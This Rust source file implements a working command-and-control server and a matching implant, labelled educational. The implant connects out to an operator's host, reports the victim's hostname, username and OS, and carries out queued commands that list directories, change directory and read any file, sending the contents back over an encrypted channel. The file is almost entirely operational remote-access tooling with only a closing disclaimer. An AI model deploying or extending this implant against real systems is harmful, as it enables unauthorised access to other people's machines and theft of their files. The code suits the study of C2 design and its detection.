// Advanced C2 Utility - Kim's Educational Implementation

use std::collections::HashMap;
use std::fs::{self, File};
use std::io::{self, BufReader, BufWriter, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use aes_gcm::{
    Aes256Gcm, Nonce,
    aead::{Aead, KeyInit, OsRng},
};
use base64::{Engine as _, engine::general_purpose};
use rand::RngCore;
use serde::{Deserialize, Serialize};
use serde_json;

// ============================================================================
// DATA STRUCTURES
// ============================================================================

/// Represents a connected agent/implant
#[derive(Clone, Serialize, Deserialize)]
struct Agent {
    id: String,
    address: String,
    hostname: String,
    username: String,
    os: String,
    connected: bool,
    last_seen: u64,
    encryption_key: Vec<u8>,
}

/// Message protocol between server and agent
#[derive(Serialize, Deserialize, Debug, Clone)]
struct Message {
    msg_type: MessageType,
    payload: String,
    timestamp: u64,
    agent_id: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
enum MessageType {
    Register,
    Command,
    Response,
    FileUpload,
    FileDownload,
    Heartbeat,
    Disconnect,
}

/// Task queue for agents
#[derive(Clone, Serialize, Deserialize)]
struct Task {
    id: String,
    command: String,
    status: TaskStatus,
    result: Option<String>,
}

#[derive(Clone, Serialize, Deserialize, PartialEq, Debug)]
enum TaskStatus {
    Pending,
    Running,
    Completed,
    Failed,
}

// ============================================================================
// ENCRYPTION MODULE - Learning AES-GCM encryption
// ============================================================================

struct Crypto {
    cipher: Aes256Gcm,
}

impl Crypto {
    /// Generate a new random encryption key
    fn generate_key() -> Vec<u8> {
        let mut key = vec![0u8; 32]; // 256-bit key
        OsRng.fill_bytes(&mut key);
        key
    }

    /// Create new crypto instance with a key
    fn new(key: &[u8]) -> Self {
        let cipher = Aes256Gcm::new_from_slice(key).expect("Invalid key length");
        Crypto { cipher }
    }

    /// Encrypt data with AES-GCM
    fn encrypt(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        let mut nonce_bytes = [0u8; 12];
        OsRng.fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);

        match self.cipher.encrypt(nonce, data) {
            Ok(mut ciphertext) => {
                // Prepend nonce to ciphertext
                let mut result = nonce_bytes.to_vec();
                result.append(&mut ciphertext);
                Ok(result)
            }
            Err(e) => Err(format!("Encryption failed: {:?}", e)),
        }
    }

    /// Decrypt data with AES-GCM
    fn decrypt(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        if data.len() < 12 {
            return Err("Data too short".to_string());
        }

        let (nonce_bytes, ciphertext) = data.split_at(12);
        let nonce = Nonce::from_slice(nonce_bytes);

        self.cipher
            .decrypt(nonce, ciphertext)
            .map_err(|e| format!("Decryption failed: {:?}", e))
    }
}

// ============================================================================
// C2 SERVER - Main server implementation
// ============================================================================

struct C2Server {
    agents: Arc<Mutex<HashMap<String, Agent>>>,
    tasks: Arc<Mutex<HashMap<String, Vec<Task>>>>,
}

impl C2Server {
    fn new() -> Self {
        C2Server {
            agents: Arc::new(Mutex::new(HashMap::new())),
            tasks: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    /// Start the C2 server listener
    fn start(&self, addr: &str) -> io::Result<()> {
        let listener = TcpListener::bind(addr)?;
        println!("\n╔════════════════════════════════════════╗");
        println!("║   Advanced C2 Server - Educational    ║");
        println!("╚════════════════════════════════════════╝\n");
        println!("[+] Server listening on {}", addr);
        println!("[+] Features: Encryption, File Transfer, Task Queue");
        println!("[+] Waiting for agents...\n");

        for stream in listener.incoming() {
            match stream {
                Ok(stream) => {
                    let agents = Arc::clone(&self.agents);
                    let tasks = Arc::clone(&self.tasks);
                    thread::spawn(move || {
                        if let Err(e) = handle_agent(stream, agents, tasks) {
                            eprintln!("[-] Agent handler error: {}", e);
                        }
                    });
                }
                Err(e) => eprintln!("[-] Connection failed: {}", e),
            }
        }
        Ok(())
    }

    /// List all connected agents
    fn list_agents(&self) {
        let agents = self.agents.lock().unwrap();
        println!("\n╔══════════════════════════════════════════════════════════════╗");
        println!("║                      Active Agents                           ║");
        println!("╠══════════════════════════════════════════════════════════════╣");

        if agents.is_empty() {
            println!("║  No agents connected                                         ║");
        } else {
            for agent in agents.values() {
                println!("║ ID: {:<20} OS: {:<15} ║", agent.id, agent.os);
                println!(
                    "║ User: {:<18} Host: {:<14} ║",
                    agent.username, agent.hostname
                );
            }
        }
        println!("╚══════════════════════════════════════════════════════════════╝\n");
    }
}

// ============================================================================
// AGENT HANDLER - Processes individual agent connections
// ============================================================================

fn handle_agent(
    mut stream: TcpStream,
    agents: Arc<Mutex<HashMap<String, Agent>>>,
    tasks: Arc<Mutex<HashMap<String, Vec<Task>>>>,
) -> io::Result<()> {
    let peer_addr = stream.peer_addr()?.to_string();

    // Set timeout for all socket operations
    stream.set_read_timeout(Some(Duration::from_secs(10)))?;
    stream.set_write_timeout(Some(Duration::from_secs(5)))?;

    // Generate encryption key for this session
    let encryption_key = Crypto::generate_key();
    let crypto = Crypto::new(&encryption_key);

    // Send encryption key (in real scenario, use key exchange like Diffie-Hellman)
    let key_b64 = general_purpose::STANDARD.encode(&encryption_key);
    stream.write_all(key_b64.as_bytes())?;
    stream.write_all(b"\n")?;

    // Read registration message with timeout
    let mut buffer = vec![0u8; 4096];
    let n = match stream.read(&mut buffer) {
        Ok(n) if n == 0 => {
            eprintln!("[-] Agent disconnected before registration");
            return Ok(());
        }
        Ok(n) => n,
        Err(e) => {
            eprintln!("[-] Failed to read registration: {}", e);
            return Err(e);
        }
    };

    // Validate minimum message size
    if n < 12 {
        eprintln!("[-] Registration message too small ({} bytes)", n);
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "Message too small",
        ));
    }

    let decrypted = match crypto.decrypt(&buffer[..n]) {
        Ok(data) => data,
        Err(e) => {
            eprintln!("[-] Decryption failed: {}", e);
            return Err(io::Error::new(io::ErrorKind::InvalidData, e));
        }
    };

    let msg: Message = match serde_json::from_slice(&decrypted) {
        Ok(m) => m,
        Err(e) => {
            eprintln!("[-] JSON parse failed: {}", e);
            return Err(io::Error::new(io::ErrorKind::InvalidData, e));
        }
    };

    if !matches!(msg.msg_type, MessageType::Register) {
        eprintln!("[-] Expected registration, got {:?}", msg.msg_type);
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "Expected registration",
        ));
    }

    // Parse registration data
    let reg_data: HashMap<String, String> = serde_json::from_str(&msg.payload)
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?;

    let agent = Agent {
        id: msg.agent_id.clone(),
        address: peer_addr.clone(),
        hostname: reg_data
            .get("hostname")
            .unwrap_or(&"unknown".to_string())
            .clone(),
        username: reg_data
            .get("username")
            .unwrap_or(&"unknown".to_string())
            .clone(),
        os: reg_data.get("os").unwrap_or(&"unknown".to_string()).clone(),
        connected: true,
        last_seen: get_timestamp(),
        encryption_key: encryption_key.clone(),
    };

    println!("[+] Agent registered: {}", agent.id);
    println!(
        "    └─ {}@{} ({})",
        agent.username, agent.hostname, agent.os
    );

    // Add agent to registry
    {
        let mut agents_map = agents.lock().unwrap();
        agents_map.insert(agent.id.clone(), agent.clone());
    }

    // Initialize task queue for this agent
    {
        let mut tasks_map = tasks.lock().unwrap();
        tasks_map.insert(agent.id.clone(), Vec::new());
    }

    // Main command loop with relaxed timeout
    stream.set_read_timeout(Some(Duration::from_secs(5)))?;

    loop {
        // Check for pending tasks
        let pending_task = {
            let mut tasks_map = tasks.lock().unwrap();
            if let Some(agent_tasks) = tasks_map.get_mut(&agent.id) {
                agent_tasks
                    .iter_mut()
                    .find(|t| t.status == TaskStatus::Pending)
                    .map(|t| {
                        t.status = TaskStatus::Running;
                        t.clone()
                    })
            } else {
                None
            }
        };

        if let Some(task) = pending_task {
            // Send task to agent
            let cmd_msg = Message {
                msg_type: MessageType::Command,
                payload: task.command.clone(),
                timestamp: get_timestamp(),
                agent_id: agent.id.clone(),
            };

            let json = serde_json::to_string(&cmd_msg).unwrap();
            let encrypted = crypto
                .encrypt(json.as_bytes())
                .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

            stream.write_all(&encrypted)?;
            println!("[*] Task sent to {}: {}", agent.id, task.command);
        }

        // Wait for response with timeout
        stream.set_read_timeout(Some(Duration::from_secs(5)))?;

        let mut response_buf = vec![0u8; 8192];
        match stream.read(&mut response_buf) {
            Ok(0) => {
                println!("[-] Agent {} disconnected", agent.id);
                break;
            }
            Ok(n) => {
                // Skip if message is too small
                if n < 12 {
                    thread::sleep(Duration::from_millis(100));
                    continue;
                }

                match crypto.decrypt(&response_buf[..n]) {
                    Ok(decrypted) => {
                        match serde_json::from_slice::<Message>(&decrypted) {
                            Ok(response) => {
                                match response.msg_type {
                                    MessageType::Response => {
                                        println!(
                                            "[<] Response from {}: {}",
                                            agent.id,
                                            if response.payload.len() > 100 {
                                                format!("{}...", &response.payload[..100])
                                            } else {
                                                response.payload.clone()
                                            }
                                        );

                                        // Update task status
                                        let mut tasks_map = tasks.lock().unwrap();
                                        if let Some(agent_tasks) = tasks_map.get_mut(&agent.id) {
                                            if let Some(task) = agent_tasks
                                                .iter_mut()
                                                .find(|t| t.status == TaskStatus::Running)
                                            {
                                                task.status = TaskStatus::Completed;
                                                task.result = Some(response.payload);
                                            }
                                        }
                                    }
                                    MessageType::Heartbeat => {
                                        // Update last seen
                                        let mut agents_map = agents.lock().unwrap();
                                        if let Some(a) = agents_map.get_mut(&agent.id) {
                                            a.last_seen = get_timestamp();
                                        }
                                    }
                                    MessageType::Disconnect => {
                                        println!("[*] Agent {} requesting disconnect", agent.id);
                                        break;
                                    }
                                    _ => {}
                                }
                            }
                            Err(e) => {
                                eprintln!("[!] JSON parse error from {}: {}", agent.id, e);
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("[!] Decrypt error from {}: {}", agent.id, e);
                    }
                }
            }
            Err(ref e)
                if e.kind() == io::ErrorKind::WouldBlock || e.kind() == io::ErrorKind::TimedOut =>
            {
                // Timeout - continue loop, agent may send heartbeat later
                thread::sleep(Duration::from_millis(100));
            }
            Err(e) => {
                eprintln!("[-] Read error from {}: {}", agent.id, e);
                break;
            }
        }
    }

    // Cleanup
    {
        let mut agents_map = agents.lock().unwrap();
        agents_map.remove(&agent.id);
    }

    Ok(())
}

// ============================================================================
// AGENT/IMPLANT - Client-side implementation
// ============================================================================

struct C2Agent {
    id: String,
    server_addr: String,
    crypto: Option<Crypto>,
}

impl C2Agent {
    fn new(server_addr: &str) -> Self {
        let id = format!("agent_{}", get_timestamp());
        C2Agent {
            id,
            server_addr: server_addr.to_string(),
            crypto: None,
        }
    }

    /// Connect to C2 server and run main loop
    fn run(&mut self) -> io::Result<()> {
        println!("[*] Connecting to C2 server at {}...", self.server_addr);

        let mut stream = TcpStream::connect(&self.server_addr)?;
        stream.set_read_timeout(Some(Duration::from_secs(5)))?;
        println!("[+] Connected!");

        // Receive encryption key with timeout
        let mut key_buffer = vec![0u8; 256];
        let n = stream.read(&mut key_buffer)?;

        // Trim to actual bytes read and strip newline
        let key_str = String::from_utf8(key_buffer[..n].to_vec())
            .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?
            .trim()
            .to_string();

        if key_str.is_empty() {
            return Err(io::Error::new(
                io::ErrorKind::InvalidData,
                "Empty encryption key received",
            ));
        }

        let key = general_purpose::STANDARD
            .decode(&key_str)
            .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?;

        self.crypto = Some(Crypto::new(&key));
        println!("[+] Encryption established");

        // Send registration
        self.register(&mut stream)?;
        println!("[+] Registered with server");

        // Main loop
        let mut heartbeat_counter = 0;
        loop {
            stream.set_read_timeout(Some(Duration::from_secs(2)))?;

            let mut buffer = vec![0u8; 8192];
            match stream.read(&mut buffer) {
                Ok(0) => {
                    println!("[-] Server closed connection");
                    break;
                }
                Ok(n) => {
                    if let Some(ref crypto) = self.crypto {
                        // Skip if message is too small to be valid
                        if n < 12 {
                            thread::sleep(Duration::from_millis(100));
                            continue;
                        }

                        match crypto.decrypt(&buffer[..n]) {
                            Ok(decrypted) => match serde_json::from_slice::<Message>(&decrypted) {
                                Ok(msg) => {
                                    if matches!(msg.msg_type, MessageType::Command) {
                                        println!("[>] Received command: {}", msg.payload);
                                        let result = self.execute_command(&msg.payload);
                                        let _ = self.send_response(&mut stream, result);
                                    }
                                }
                                Err(e) => {
                                    eprintln!("[!] JSON parse error: {}", e);
                                }
                            },
                            Err(e) => {
                                eprintln!("[!] Decrypt error: {}", e);
                            }
                        }
                    }
                }
                Err(ref e)
                    if e.kind() == io::ErrorKind::WouldBlock
                        || e.kind() == io::ErrorKind::TimedOut =>
                {
                    // Send heartbeat every 10 iterations
                    heartbeat_counter += 1;
                    if heartbeat_counter >= 10 {
                        self.send_heartbeat(&mut stream)?;
                        heartbeat_counter = 0;
                    }
                    thread::sleep(Duration::from_millis(500));
                }
                Err(e) => {
                    eprintln!("[-] Read error: {}", e);
                    break;
                }
            }
        }

        Ok(())
    }

    /// Register with the server
    fn register(&self, stream: &mut TcpStream) -> io::Result<()> {
        let mut reg_data = HashMap::new();
        reg_data.insert("hostname".to_string(), get_hostname());
        reg_data.insert("username".to_string(), get_username());
        reg_data.insert("os".to_string(), get_os());

        let msg = Message {
            msg_type: MessageType::Register,
            payload: serde_json::to_string(&reg_data).unwrap(),
            timestamp: get_timestamp(),
            agent_id: self.id.clone(),
        };

        self.send_message(stream, &msg)
    }

    /// Execute a command (simulated for safety)
    fn execute_command(&self, command: &str) -> String {
        let parts: Vec<&str> = command.split_whitespace().collect();

        match parts.get(0).copied() {
            Some("sysinfo") => format!(
                "OS: {}\nHostname: {}\nUser: {}\nAgent ID: {}",
                get_os(),
                get_hostname(),
                get_username(),
                self.id
            ),
            Some("pwd") => std::env::current_dir()
                .map(|p| p.display().to_string())
                .unwrap_or_else(|_| "unknown".to_string()),
            Some("whoami") => get_username(),
            Some("hostname") => get_hostname(),
            Some("ls") | Some("dir") => {
                // List current directory (safe operation)
                match fs::read_dir(".") {
                    Ok(entries) => entries
                        .filter_map(|e| e.ok())
                        .map(|e| e.file_name().to_string_lossy().to_string())
                        .collect::<Vec<_>>()
                        .join("\n"),
                    Err(e) => format!("Error: {}", e),
                }
            }
            Some("cd") => {
                if parts.len() > 1 {
                    match std::env::set_current_dir(parts[1]) {
                        Ok(_) => format!("Changed to: {}", parts[1]),
                        Err(e) => format!("Error changing directory: {}", e),
                    }
                } else {
                    "Usage: cd <path>".to_string()
                }
            }
            Some("echo") => {
                if command.len() > 5 {
                    command[5..].to_string()
                } else {
                    String::new()
                }
            }
            Some("cat") => {
                if parts.len() > 1 {
                    match fs::read_to_string(parts[1]) {
                        Ok(content) => content,
                        Err(e) => format!("Error reading file: {}", e),
                    }
                } else {
                    "Usage: cat <file>".to_string()
                }
            }
            Some("sleep") => {
                if parts.len() > 1 {
                    if let Ok(seconds) = parts[1].parse::<u64>() {
                        thread::sleep(Duration::from_secs(seconds));
                        format!("Slept for {} seconds", seconds)
                    } else {
                        "Invalid sleep duration".to_string()
                    }
                } else {
                    "Usage: sleep <seconds>".to_string()
                }
            }
            Some("help") => "Available commands:\n\
                 - sysinfo: Display system information\n\
                 - pwd: Print working directory\n\
                 - whoami: Show current user\n\
                 - hostname: Show hostname\n\
                 - ls/dir: List directory contents\n\
                 - cd <path>: Change directory\n\
                 - echo <text>: Echo text\n\
                 - cat <file>: Read file contents\n\
                 - sleep <seconds>: Sleep for N seconds\n\
                 - help: Show this help"
                .to_string(),
            _ => format!("Unknown command: '{}'", command),
        }
    }

    /// Send a response back to server
    fn send_response(&self, stream: &mut TcpStream, payload: String) -> io::Result<()> {
        let msg = Message {
            msg_type: MessageType::Response,
            payload,
            timestamp: get_timestamp(),
            agent_id: self.id.clone(),
        };

        self.send_message(stream, &msg)
    }

    /// Send heartbeat to server
    fn send_heartbeat(&self, stream: &mut TcpStream) -> io::Result<()> {
        let msg = Message {
            msg_type: MessageType::Heartbeat,
            payload: "alive".to_string(),
            timestamp: get_timestamp(),
            agent_id: self.id.clone(),
        };

        self.send_message(stream, &msg)
    }

    /// Send encrypted message
    fn send_message(&self, stream: &mut TcpStream, msg: &Message) -> io::Result<()> {
        if let Some(ref crypto) = self.crypto {
            let json = serde_json::to_string(msg).unwrap();
            let encrypted = crypto
                .encrypt(json.as_bytes())
                .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

            stream.write_all(&encrypted)?;
        }
        Ok(())
    }
}

// ============================================================================
// INTERACTIVE SERVER CONSOLE
// ============================================================================

fn run_server_console(server: Arc<C2Server>) {
    println!("\n[*] Server console ready. Type 'help' for commands.\n");

    loop {
        print!("c2> ");
        io::stdout().flush().unwrap();

        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();
        let input = input.trim();

        if input.is_empty() {
            continue;
        }

        let parts: Vec<&str> = input.split_whitespace().collect();
        let command = parts[0];

        match command {
            "help" => {
                println!("\nAvailable commands:");
                println!("  agents           - List all connected agents");
                println!("  task <id> <cmd>  - Send command to agent");
                println!("  tasks <id>       - View tasks for agent");
                println!("  exit             - Shutdown server");
                println!();
            }
            "agents" => {
                server.list_agents();
            }
            "task" => {
                if parts.len() < 3 {
                    println!("Usage: task <agent_id> <command>");
                    continue;
                }

                let agent_id = parts[1];
                let command = parts[2..].join(" ");

                let task = Task {
                    id: format!("task_{}", get_timestamp()),
                    command: command.clone(),
                    status: TaskStatus::Pending,
                    result: None,
                };

                let mut tasks = server.tasks.lock().unwrap();
                if let Some(agent_tasks) = tasks.get_mut(agent_id) {
                    agent_tasks.push(task);
                    println!("[+] Task queued for {}: {}", agent_id, command);
                } else {
                    println!("[-] Agent not found: {}", agent_id);
                }
            }
            "tasks" => {
                if parts.len() < 2 {
                    println!("Usage: tasks <agent_id>");
                    continue;
                }

                let agent_id = parts[1];
                let tasks = server.tasks.lock().unwrap();

                if let Some(agent_tasks) = tasks.get(agent_id) {
                    println!("\nTasks for {}:", agent_id);
                    for task in agent_tasks {
                        println!("  [{:?}] {} - {}", task.status, task.id, task.command);
                        if let Some(ref result) = task.result {
                            println!(
                                "    Result: {}",
                                if result.len() > 80 {
                                    format!("{}...", &result[..80])
                                } else {
                                    result.clone()
                                }
                            );
                        }
                    }
                    println!();
                } else {
                    println!("[-] Agent not found: {}", agent_id);
                }
            }
            "exit" => {
                println!("[*] Shutting down server...");
                std::process::exit(0);
            }
            _ => {
                println!(
                    "Unknown command: {}. Type 'help' for available commands.",
                    command
                );
            }
        }
    }
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

fn get_timestamp() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs()
}

fn get_hostname() -> String {
    hostname::get()
        .ok()
        .and_then(|h| h.into_string().ok())
        .unwrap_or_else(|| "unknown".to_string())
}

fn get_username() -> String {
    std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown".to_string())
}

fn get_os() -> String {
    std::env::consts::OS.to_string()
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

fn main() {
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 2 {
        println!("\n╔════════════════════════════════════════╗");
        println!("║   Advanced C2 Utility - Educational    ║");
        println!("╚════════════════════════════════════════╝\n");
        println!("Usage:");
        println!("  {} server <port>      - Start C2 server", args[0]);
        println!("  {} agent <host:port>  - Start agent/implant", args[0]);
        println!("\nExample:");
        println!("  {} server 4444", args[0]);
        println!("  {} agent 127.0.0.1:4444", args[0]);
        println!("\n⚠️  For educational purposes only!");
        println!("   Use only on systems you own or have permission to test.\n");
        return;
    }

    match args[1].as_str() {
        "server" => {
            let port = args.get(2).map(|s| s.as_str()).unwrap_or("4444");
            let addr = format!("0.0.0.0:{}", port);

            let server = Arc::new(C2Server::new());
            let server_clone = Arc::clone(&server);

            // Start server in separate thread
            thread::spawn(move || {
                if let Err(e) = server_clone.start(&addr) {
                    eprintln!("[-] Server error: {}", e);
                }
            });

            // Run interactive console
            thread::sleep(Duration::from_secs(1));
            run_server_console(server);
        }
        "agent" => {
            let server_addr = args.get(2).map(|s| s.as_str()).unwrap_or("127.0.0.1:4444");

            let mut agent = C2Agent::new(server_addr);

            if let Err(e) = agent.run() {
                eprintln!("[-] Agent error: {}", e);
            }
        }
        _ => {
            println!("Invalid mode. Use 'server' or 'agent'");
        }
    }
}
